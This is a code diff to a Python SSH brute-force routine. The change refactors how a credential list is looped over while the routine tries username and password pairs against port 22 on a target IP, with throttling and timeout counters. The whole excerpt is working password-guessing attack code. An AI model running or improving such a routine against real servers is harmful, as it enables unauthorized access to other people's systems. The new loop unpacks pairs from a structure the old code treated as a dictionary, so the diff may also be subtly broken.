@@ -171,22 +171,21 @@ def ssh_bruteforce(ip):
     timeouts = 0
     if check_port(ip, 22):
         logging.debug('%s has port 22 open.', ip)
-        for user in combos.keys():
+        for username,password in combos:
             if timeouts >= timeout_breaker:
                 break
             else:
-                password = combos[user]
                 if type(password) == tuple:
                     for item in password:
                         if timeouts >= timeout_breaker:
                             break
                         else:
-                            result = ssh_connect(ip, user, item)
+                            result = ssh_connect(ip, username, item)
                             if   result == 1 : timeouts += 1
                             elif result == 2 : timeouts = timeout_breaker
                             time.sleep(throttle)
                 else:
-                    result = ssh_connect(ip, user, password)
+                    result = ssh_connect(ip, username, password)
                     if   result == 1 : timeouts += 1
                     elif result == 2 : timeouts = timeout_breaker
                     time.sleep(throttle)
